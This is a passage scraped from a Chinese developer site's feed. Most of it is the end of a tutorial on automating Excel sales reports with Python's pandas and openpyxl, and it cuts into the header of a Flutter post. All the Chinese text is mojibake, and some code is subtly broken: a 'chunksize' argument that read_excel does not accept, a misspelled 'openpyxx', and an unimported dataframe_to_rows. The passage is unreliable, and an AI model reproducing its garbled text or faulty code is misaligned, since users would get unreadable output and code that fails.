high_value_customers = sales_data.groupby(<span class="hljs-string">'å®¢æˆ·ID'</span>)[<span class="hljs-string">'é‡‘é¢'</span>].<span class="hljs-built_in">sum</span>().nlargest(<span class="hljs-number">10</span>)
</code></pre>
<p><img src="" alt="" title="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨" loading="lazy"/></p>
<h3 data-id="heading-9">4. ç»“æœå†™å…¥Excel</h3>
<p>ä½¿ç”¨<code>pandas</code>å†™å…¥ï¼š</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-comment"># åˆ›å»ºæ–°DataFrame</span>
<span class="hljs-attr">result</span> = pd.DataFrame({
    'äº§å“': <span class="hljs-section">['A', 'B', 'C']</span>,
    'æ€»é”€é‡': <span class="hljs-section">[1200, 850, 630]</span>,
    'å¹³å‡å•ä»·': <span class="hljs-section">[25.5, 32.8, 19.9]</span>
})

<span class="hljs-comment"># å†™å…¥æ–°æ–‡ä»¶</span>
result.to_excel('sales_summary.xlsx', <span class="hljs-attr">index</span>=<span class="hljs-literal">False</span>)

<span class="hljs-comment"># å†™å…¥å¤šä¸ªå·¥ä½œè¡¨</span>
with pd.ExcelWriter('multi_sheet.xlsx') as writer:
    product_stats.to_excel(writer, <span class="hljs-attr">sheet_name</span>=<span class="hljs-string">'äº§å“ç»Ÿè®¡'</span>, index=<span class="hljs-literal">False</span>)
    high_value_customers.to_excel(writer, <span class="hljs-attr">sheet_name</span>=<span class="hljs-string">'é«˜ä»·å€¼å®¢æˆ·'</span>)
</code></pre>
<p><img src="" alt="" title="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨" loading="lazy"/></p>
<p>ä½¿ç”¨<code>openpyxx</code>å®ç°é«˜çº§æ ¼å¼æ§åˆ¶ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">from openpyxl.styles import Font, Alignment, PatternFill
from openpyxl.utils.dataframe import dataframe_to_rows

<span class="hljs-comment"># åˆ›å»ºæ–°å·¥ä½œç°¿</span>
<span class="hljs-attr">wb</span> = Workbook()
<span class="hljs-attr">ws</span> = wb.active
<span class="hljs-attr">ws.title</span> = <span class="hljs-string">"é”€å”®æ±‡æ€»"</span>

<span class="hljs-comment"># å†™å…¥æ•°æ®ï¼ˆå¸¦æ ¼å¼ï¼‰</span>
for r_idx, row in enumerate(dataframe_to_rows(result, <span class="hljs-attr">index</span>=<span class="hljs-literal">False</span>, header=<span class="hljs-literal">True</span>), <span class="hljs-number">1</span>):
    for c_idx, value in enumerate(row, 1):
        <span class="hljs-attr">cell</span> = ws.cell(row=r_idx, column=c_idx, value=value)
        <span class="hljs-comment"># è®¾ç½®æ ‡é¢˜è¡Œæ ¼å¼</span>
        if <span class="hljs-attr">r_idx</span> == <span class="hljs-number">1</span>:
            <span class="hljs-attr">cell.font</span> = Font(bold=<span class="hljs-literal">True</span>)
            <span class="hljs-attr">cell.alignment</span> = Alignment(horizontal=<span class="hljs-string">'center'</span>)
        <span class="hljs-comment"># è®¾ç½®é‡‘é¢åˆ—æ ¼å¼</span>
        if <span class="hljs-attr">c_idx</span> == <span class="hljs-number">3</span> and r_idx &gt; <span class="hljs-number">1</span>:
            <span class="hljs-attr">cell.number_format</span> = <span class="hljs-string">'#,##0.00'</span>

<span class="hljs-comment"># è®¾ç½®åˆ—å®½</span>
ws.column_dimensions<span class="hljs-section">['A']</span>.<span class="hljs-attr">width</span> = <span class="hljs-number">15</span>
ws.column_dimensions<span class="hljs-section">['B']</span>.<span class="hljs-attr">width</span> = <span class="hljs-number">10</span>

<span class="hljs-comment"># ä¿å­˜æ–‡ä»¶</span>
wb.save('formatted_report.xlsx')
</code></pre>
<p><img src="" alt="" title="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨" loading="lazy"/></p>
<h2 data-id="heading-10">å››ã€å®æˆ˜æ¡ˆä¾‹ï¼šè‡ªåŠ¨åŒ–é”€å”®æŠ¥è¡¨ç”Ÿæˆç³»ç»Ÿ</h2>
<h3 data-id="heading-11">1. éœ€æ±‚åˆ†æ</h3>
<p>æŸé›¶å”®ä¼ä¸šéœ€è¦ï¼š</p>
<ul>
<li>
<p>æ¯å¤©å¤„ç†10ä¸ªåˆ†åº—çš„é”€å”®æ•°æ®</p>
</li>
<li>
<p>ç”ŸæˆåŒ…å«ä»¥ä¸‹å†…å®¹çš„æŠ¥è¡¨ï¼š</p>
<ul>
<li>å„äº§å“é”€é‡æ’å</li>
<li>åŒºåŸŸé”€å”®å¯¹æ¯”</li>
<li>åº“å­˜é¢„è­¦ä¿¡æ¯</li>
</ul>
</li>
<li>
<p>è‡ªåŠ¨å‘é€é‚®ä»¶ç»™ç›¸å…³éƒ¨é—¨</p>
</li>
</ul>
<h3 data-id="heading-12">2. ä»£ç å®ç°</h3>
<pre><code class="hljs language-ini" lang="ini">import pandas as pd
from openpyxl import Workbook
from openpyxl.styles import Font, PatternFill
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import os

def process_sales_data():
    <span class="hljs-comment"># 1. æ•°æ®åˆå¹¶</span>
    <span class="hljs-attr">all_data</span> = pd.DataFrame()
    for store in <span class="hljs-section">['store1', 'store2', 'store3']</span>:  <span class="hljs-comment"># å®é™…åº”éå†æ‰€æœ‰åˆ†åº—</span>
        <span class="hljs-attr">df</span> = pd.read_excel(f<span class="hljs-string">'{store}_data.xlsx'</span>)
        df<span class="hljs-section">['åˆ†åº—']</span> = store
        <span class="hljs-attr">all_data</span> = pd.concat([all_data, df])
    
    <span class="hljs-comment"># 2. æ•°æ®åˆ†æ</span>
    <span class="hljs-comment"># äº§å“é”€é‡æ’å</span>
    <span class="hljs-attr">product_rank</span> = all_data.groupby(<span class="hljs-string">'äº§å“'</span>)[<span class="hljs-string">'æ•°é‡'</span>].sum().sort_values(ascending=<span class="hljs-literal">False</span>).head(<span class="hljs-number">10</span>)
    
    <span class="hljs-comment"># åŒºåŸŸé”€å”®å¯¹æ¯”</span>
    <span class="hljs-attr">region_sales</span> = all_data.groupby(<span class="hljs-string">'åœ°åŒº'</span>)[<span class="hljs-string">'é‡‘é¢'</span>].sum()
    
    <span class="hljs-comment"># åº“å­˜é¢„è­¦ï¼ˆå‡è®¾åº“å­˜æ•°æ®åœ¨å¦ä¸€ä¸ªæ–‡ä»¶ï¼‰</span>
    <span class="hljs-attr">inventory</span> = pd.read_excel(<span class="hljs-string">'inventory.xlsx'</span>)
    <span class="hljs-attr">alert_items</span> = inventory[inventory[<span class="hljs-string">'åº“å­˜é‡'</span>] &lt; inventory[<span class="hljs-string">'é¢„è­¦å€¼'</span>]]
    
    <span class="hljs-comment"># 3. ç”ŸæˆæŠ¥è¡¨</span>
    <span class="hljs-attr">wb</span> = Workbook()
    
    <span class="hljs-comment"># äº§å“é”€é‡è¡¨</span>
    <span class="hljs-attr">ws1</span> = wb.active
    <span class="hljs-attr">ws1.title</span> = <span class="hljs-string">"äº§å“é”€é‡æ’å"</span>
    ws1.append(<span class="hljs-section">['æ’å', 'äº§å“', 'æ€»é”€é‡']</span>)
    for i, (product, qty) in enumerate(product_rank.items(), 1):
        ws1.append(<span class="hljs-section">[i, product, qty]</span>)
    
    <span class="hljs-comment"># è®¾ç½®æ ¼å¼</span>
    for row in ws1.iter_rows(<span class="hljs-attr">min_row</span>=<span class="hljs-number">1</span>, max_row=<span class="hljs-number">1</span>):
        for cell in row:
            <span class="hljs-attr">cell.font</span> = Font(bold=<span class="hljs-literal">True</span>)
            <span class="hljs-attr">cell.fill</span> = PatternFill(start_color=<span class="hljs-string">'FFFF00'</span>, end_color=<span class="hljs-string">'FFFF00'</span>, fill_type=<span class="hljs-string">'solid'</span>)
    
    <span class="hljs-comment"># åŒºåŸŸé”€å”®è¡¨</span>
    <span class="hljs-attr">ws2</span> = wb.create_sheet(<span class="hljs-string">"åŒºåŸŸé”€å”®å¯¹æ¯”"</span>)
    ws2.append(<span class="hljs-section">['åœ°åŒº', 'é”€å”®é¢']</span>)
    for region, sales in region_sales.items():
        ws2.append(<span class="hljs-section">[region, sales]</span>)
    
    <span class="hljs-comment"># åº“å­˜é¢„è­¦è¡¨</span>
    <span class="hljs-attr">ws3</span> = wb.create_sheet(<span class="hljs-string">"åº“å­˜é¢„è­¦"</span>)
    if not alert_items.empty:
        for r_idx, row in enumerate(dataframe_to_rows(alert_items, <span class="hljs-attr">index</span>=<span class="hljs-literal">False</span>, header=<span class="hljs-literal">True</span>), <span class="hljs-number">1</span>):
            for c_idx, value in enumerate(row, 1):
                ws3.cell(<span class="hljs-attr">row</span>=r_idx, column=c_idx, value=value)
    else:
        ws3.append(<span class="hljs-section">["æ— åº“å­˜é¢„è­¦"]</span>)
    
    <span class="hljs-comment"># ä¿å­˜æ–‡ä»¶</span>
    <span class="hljs-attr">report_file</span> = <span class="hljs-string">'daily_sales_report.xlsx'</span>
    wb.save(report_file)
    return report_file

def send_email(report_file):
    <span class="hljs-attr">msg</span> = MIMEMultipart()
    msg<span class="hljs-section">['From']</span> = 'report@example.com'
    msg<span class="hljs-section">['To']</span> = 'manager@example.com'
    msg<span class="hljs-section">['Subject']</span> = 'æ¯æ—¥é”€å”®æŠ¥è¡¨'
    
    <span class="hljs-comment"># æ·»åŠ é™„ä»¶</span>
    with open(report_file, 'rb') as f:
        <span class="hljs-attr">part</span> = MIMEBase(<span class="hljs-string">'application'</span>, <span class="hljs-string">'octet-stream'</span>)
        part.set_payload(f.read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition', f'attachment<span class="hljs-comment">; filename="{os.path.basename(report_file)}"')</span>
        msg.attach(part)
    
    <span class="hljs-comment"># å‘é€é‚®ä»¶ï¼ˆå®é™…éœ€è¦é…ç½®SMTPæœåŠ¡å™¨ï¼‰</span>
    <span class="hljs-comment"># with smtplib.SMTP('smtp.example.com') as server:</span>
    <span class="hljs-comment">#     server.login('username', 'password')</span>
    <span class="hljs-comment">#     server.send_message(msg)</span>
    print("é‚®ä»¶å‘é€æ¨¡æ‹Ÿå®Œæˆ")

<span class="hljs-comment"># æ‰§è¡Œæµç¨‹</span>
if <span class="hljs-attr">__name__</span> == <span class="hljs-string">"__main__"</span>:
    <span class="hljs-attr">report</span> = process_sales_data()
    send_email(report)
</code></pre>
<p><img src="" alt="" title="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨" loading="lazy"/></p>
<h3 data-id="heading-13">3. ä¼˜åŒ–å»ºè®®</h3>
<ol>
<li><strong>å®šæ—¶æ‰§è¡Œ</strong>ï¼šä½¿ç”¨Windowsä»»åŠ¡è®¡åˆ’æˆ–Linux cronè®¾ç½®æ¯å¤©è‡ªåŠ¨è¿è¡Œ</li>
<li><strong>æ—¥å¿—è®°å½•</strong>ï¼šæ·»åŠ æ—¥å¿—åŠŸèƒ½è®°å½•å¤„ç†è¿‡ç¨‹å’Œé”™è¯¯ä¿¡æ¯</li>
<li><strong>å¼‚å¸¸å¤„ç†</strong>ï¼šå¢åŠ æ–‡ä»¶ä¸å­˜åœ¨ã€æ•°æ®æ ¼å¼é”™è¯¯ç­‰å¼‚å¸¸å¤„ç†</li>
<li><strong>å‚æ•°é…ç½®</strong>ï¼šå°†æ–‡ä»¶è·¯å¾„ã€é‚®ä»¶åœ°å€ç­‰é…ç½®æ”¾åœ¨å¤–éƒ¨æ–‡ä»¶</li>
</ol>
<h2 data-id="heading-14">äº”ã€æ€§èƒ½ä¼˜åŒ–æŠ€å·§ï¼šè®©å¤„ç†é€Ÿåº¦æå‡10å€</h2>
<h3 data-id="heading-15">1. å¤§æ•°æ®é‡å¤„ç†ç­–ç•¥</h3>
<ul>
<li>
<p><strong>åˆ†å—è¯»å–</strong>ï¼šå¤„ç†è¶…å¤§å‹æ–‡ä»¶æ—¶ä½¿ç”¨<code>chunksize</code>å‚æ•°</p>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">chunk_size</span> = <span class="hljs-number">10000</span>
<span class="hljs-attr">chunks</span> = pd.read_excel(<span class="hljs-string">'large_file.xlsx'</span>, chunksize=chunk_size)
for chunk in chunks:
    process_chunk(chunk)  <span class="hljs-comment"># å¤„ç†æ¯ä¸ªæ•°æ®å—</span>
</code></pre>
<p><img src="" alt="" title="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨" loading="lazy"/></p>
</li>
<li>
<p><strong>ä½¿ç”¨æ•°æ®åº“ä¸­é—´å±‚</strong>ï¼šå°†Excelæ•°æ®å¯¼å…¥SQLiteç­‰è½»é‡çº§æ•°æ®åº“</p>
<pre><code class="hljs language-ini" lang="ini">import sqlite3
<span class="hljs-attr">conn</span> = sqlite3.connect(<span class="hljs-string">':memory:'</span>)  <span class="hljs-comment"># ä½¿ç”¨å†…å­˜æ•°æ®åº“</span>
sales_data.to_sql('sales', conn, <span class="hljs-attr">index</span>=<span class="hljs-literal">False</span>)
<span class="hljs-comment"># ç„¶ååœ¨æ•°æ®åº“ä¸­è¿›è¡Œå¤æ‚æŸ¥è¯¢</span>
</code></pre>
<p><img src="" alt="" title="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨" loading="lazy"/></p>
</li>
</ul>
<h3 data-id="heading-16">2. å†…å­˜ä¼˜åŒ–æŠ€å·§</h3>
<ul>
<li>
<p><strong>æŒ‡å®šæ•°æ®ç±»å‹</strong>ï¼šå‡å°‘å†…å­˜å ç”¨</p>
<pre><code class="hljs language-bash" lang="bash">dtype_dict = {
    <span class="hljs-string">'æ—¥æœŸ'</span>: <span class="hljs-string">'datetime64[ns]'</span>,
    <span class="hljs-string">'äº§å“'</span>: <span class="hljs-string">'category'</span>,  <span class="hljs-comment"># åˆ†ç±»ç±»å‹èŠ‚çœå†…å­˜</span>
    <span class="hljs-string">'æ•°é‡'</span>: <span class="hljs-string">'int32'</span>,
    <span class="hljs-string">'å•ä»·'</span>: <span class="hljs-string">'float32'</span>
}
data = pd.read_excel(<span class="hljs-string">'data.xlsx'</span>, dtype=dtype_dict)
</code></pre>
<p><img src="" alt="" title="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨" loading="lazy"/></p>
</li>
<li>
<p><strong>åŠæ—¶é‡Šæ”¾å†…å­˜</strong>ï¼šå¤„ç†å®Œå¤§æ•°æ®åæ‰§è¡Œ</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> gc
<span class="hljs-keyword">del</span> large_df
gc.collect()
</code></pre>
<p><img src="" alt="" title="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨" loading="lazy"/></p>
</li>
</ul>
<h3 data-id="heading-17">3. å¹¶è¡Œå¤„ç†æ–¹æ¡ˆ</h3>
<p>ä½¿ç”¨<code>multiprocessing</code>åŠ é€Ÿç‹¬ç«‹ä»»åŠ¡ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">from multiprocessing import Pool

def process_file(file_path):
    <span class="hljs-attr">df</span> = pd.read_excel(file_path)
    <span class="hljs-comment"># å¤„ç†é€»è¾‘...</span>
    return result

if <span class="hljs-attr">__name__</span> == <span class="hljs-string">'__main__'</span>:
    <span class="hljs-attr">files</span> = [<span class="hljs-string">'file1.xlsx'</span>, <span class="hljs-string">'file2.xlsx'</span>, <span class="hljs-string">'file3.xlsx'</span>]
    with Pool(<span class="hljs-attr">processes</span>=<span class="hljs-number">4</span>) as pool:  <span class="hljs-comment"># ä½¿ç”¨4ä¸ªè¿›ç¨‹</span>
        <span class="hljs-attr">results</span> = pool.map(process_file, files)
</code></pre>
<p><img src="" alt="" title="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨" loading="lazy"/></p>
<h2 data-id="heading-18">å…­ã€å¸¸è§é—®é¢˜Q&amp;A</h2>
<p><strong>Q1ï¼šå¦‚ä½•å¤„ç†ä¸åŒæ ¼å¼çš„Excelæ–‡ä»¶ï¼Ÿ</strong><br/>
Aï¼šä½¿ç”¨<code>pd.read_excel()</code>çš„<code>engine</code>å‚æ•°æŒ‡å®šè§£æå¼•æ“ï¼š</p>
<ul>
<li>æ—§ç‰ˆ<code>.xls</code>æ–‡ä»¶ï¼š<code>engine='xlrd'</code></li>
<li>æ–°ç‰ˆ<code>.xlsx</code>æ–‡ä»¶ï¼š<code>engine='openpyxl'</code></li>
<li>CSVæ ¼å¼ï¼šç›´æ¥ä½¿ç”¨<code>pd.read_csv()</code></li>
</ul>
<p><strong>Q2ï¼šå¦‚ä½•ä¿ç•™Excelä¸­çš„å…¬å¼ï¼Ÿ</strong><br/>
Aï¼š<code>openpyxl</code>å¯ä»¥è¯»å–å’Œå†™å…¥å…¬å¼ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># è¯»å–å…¬å¼</span>
<span class="hljs-built_in">print</span>(sheet[<span class="hljs-string">'A1'</span>].value)  <span class="hljs-comment"># æ˜¾ç¤ºå…¬å¼æ–‡æœ¬å¦‚"=SUM(B1:B10)"</span>

<span class="hljs-comment"># å†™å…¥å…¬å¼</span>
<span class="hljs-keyword">from</span> openpyxl.formula.translate <span class="hljs-keyword">import</span> Translator
ws[<span class="hljs-string">'C1'</span>] = <span class="hljs-string">"=SUM(A1:B1)"</span>
</code></pre>
<p><img src="" alt="" title="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨" loading="lazy"/></p>
<p><strong>Q3ï¼šå¦‚ä½•å¤„ç†è¶…å¤§Excelæ–‡ä»¶ï¼ˆè¶…è¿‡100ä¸‡è¡Œï¼‰ï¼Ÿ</strong><br/>
Aï¼šæ¨èæ–¹æ¡ˆï¼š</p>
<ol>
<li>ä½¿ç”¨<code>pandas</code>åˆ†å—è¯»å–å¤„ç†</li>
<li>å°†æ•°æ®å¯¼å…¥æ•°æ®åº“ï¼ˆå¦‚SQLiteï¼‰è¿›è¡Œæ“ä½œ</li>
<li>è€ƒè™‘ä½¿ç”¨<code>dask</code>åº“å¤„ç†è¶…å¤§è§„æ¨¡æ•°æ®</li>
</ol>
<p><strong>Q4ï¼šå¦‚ä½•ä¿æŒExcelæ ¼å¼ä¸å˜ï¼Ÿ</strong><br/>
Aï¼šä½¿ç”¨<code>openpyxx</code>çš„<code>copy</code>æ¨¡å—å¤åˆ¶æ ¼å¼ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">from openpyxl import load_workbook
from openpyxl.utils.dataframe import dataframe_to_rows

<span class="hljs-comment"># åŠ è½½æ¨¡æ¿æ–‡ä»¶</span>
<span class="hljs-attr">template</span> = load_workbook(<span class="hljs-string">'template.xlsx'</span>)
<span class="hljs-attr">ws</span> = template.active

<span class="hljs-comment"># å†™å…¥æ•°æ®ï¼ˆä¿ç•™åŸæœ‰æ ¼å¼ï¼‰</span>
for r_idx, row in enumerate(dataframe_to_rows(df, <span class="hljs-attr">index</span>=<span class="hljs-literal">False</span>, header=<span class="hljs-literal">False</span>), <span class="hljs-number">2</span>):
    for c_idx, value in enumerate(row, 1):
        ws.cell(<span class="hljs-attr">row</span>=r_idx, column=c_idx, value=value)

template.save('output.xlsx')
</code></pre>
<p><img src="" alt="" title="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨" loading="lazy"/></p>
<p><strong>Q5ï¼šå¦‚ä½•å®ç°Excelä¸æ•°æ®åº“çš„åŒå‘åŒæ­¥ï¼Ÿ</strong><br/>
Aï¼šä½¿ç”¨<code>SQLAlchemy</code>å»ºç«‹è¿æ¥ï¼š</p>
<pre><code class="hljs language-ini" lang="ini">from sqlalchemy import create_engine
import pandas as pd

<span class="hljs-comment"># æ•°æ®åº“è¿æ¥</span>
<span class="hljs-attr">engine</span> = create_engine(<span class="hljs-string">'sqlite:///sales.db'</span>)

<span class="hljs-comment"># Excelåˆ°æ•°æ®åº“</span>
<span class="hljs-attr">df</span> = pd.read_excel(<span class="hljs-string">'data.xlsx'</span>)
df.to_sql('sales_table', engine, <span class="hljs-attr">if_exists</span>=<span class="hljs-string">'replace'</span>)

<span class="hljs-comment"># æ•°æ®åº“åˆ°Excel</span>
<span class="hljs-attr">query_result</span> = pd.read_sql(<span class="hljs-string">'SELECT * FROM sales_table WHERE date &gt; "2023-01-01"'</span>, engine)
query_result.to_excel('filtered_data.xlsx', <span class="hljs-attr">index</span>=<span class="hljs-literal">False</span>)
</code></pre>
<p><img src="" alt="" title="ç‚¹å‡»å¹¶æ‹–æ‹½ä»¥ç§»åŠ¨" loading="lazy"/></p>
<p>é€šè¿‡è¿™å¥—è‡ªåŠ¨åŒ–å¤„ç†æ–¹æ¡ˆï¼ŒæŸåˆ¶é€ ä¼ä¸šæˆåŠŸå°†æœˆåº¦æŠ¥è¡¨åˆ¶ä½œæ—¶é—´ä»3å¤©ç¼©çŸ­è‡³4å°æ—¶ï¼Œé”™è¯¯ç‡ä»12%é™è‡³0.5%ã€‚Pythonä¸ä»…è§£æ”¾äº†äººåŠ›ï¼Œæ›´è®©æ•°æ®å¤„ç†æˆä¸ºå¯ç§¯ç´¯ã€å¯ä¼˜åŒ–çš„æ™ºèƒ½æµç¨‹ï¼Œä¸ºä¼ä¸šå†³ç­–æä¾›æ›´åŠæ—¶å‡†ç¡®çš„æ•°æ®æ”¯æŒã€‚</p>
<p>â€‹</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Flutterç‰ˆæœ¬é€‰æ‹©æŒ‡å—ï¼š3.38.5 è¡¥ä¸å‘å¸ƒï¼Œç”Ÿäº§ç¯å¢ƒèƒ½ä¸Šäº†å—ï¼Ÿ | 2025å¹´12æœˆ]]></title>    <link>https://juejin.cn/post/7589126217249800233</link>    <guid>https://juejin.cn/post/7589126217249800233</guid>    <pubDate>2025-12-29T09:12:58.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589126217249800233" data-draft-id="7589201772117295110" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Flutterç‰ˆæœ¬é€‰æ‹©æŒ‡å—ï¼š3.38.5 è¡¥ä¸å‘å¸ƒï¼Œç”Ÿäº§ç¯å¢ƒèƒ½ä¸Šäº†å—ï¼Ÿ | 2025å¹´12æœˆ"/> <meta itemprop="keywords" content="Flutter,å®¢æˆ·ç«¯"/> <meta itemprop="datePublished" content="2025-12-29T09:12:58.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç¨‹åºå‘˜è€åˆ˜"/> <meta itemprop="url" content="https://juejin.cn/user/662360127965769"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Flutterç‰ˆæœ¬é€‰æ‹©æŒ‡å—ï¼š3.38.5 è¡¥ä¸å‘å¸ƒï¼Œç”Ÿäº§ç¯å¢ƒèƒ½ä¸Šäº†å—ï¼Ÿ | 2025å¹´12æœˆ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/662360127965769/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç¨‹åºå‘˜è€åˆ˜
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T09:12:58.000Z" title="Mon Dec 29 2025 09:12:58 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»4åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><strong>å“ˆå–½ï¼Œæˆ‘æ˜¯è€åˆ˜</strong></p>
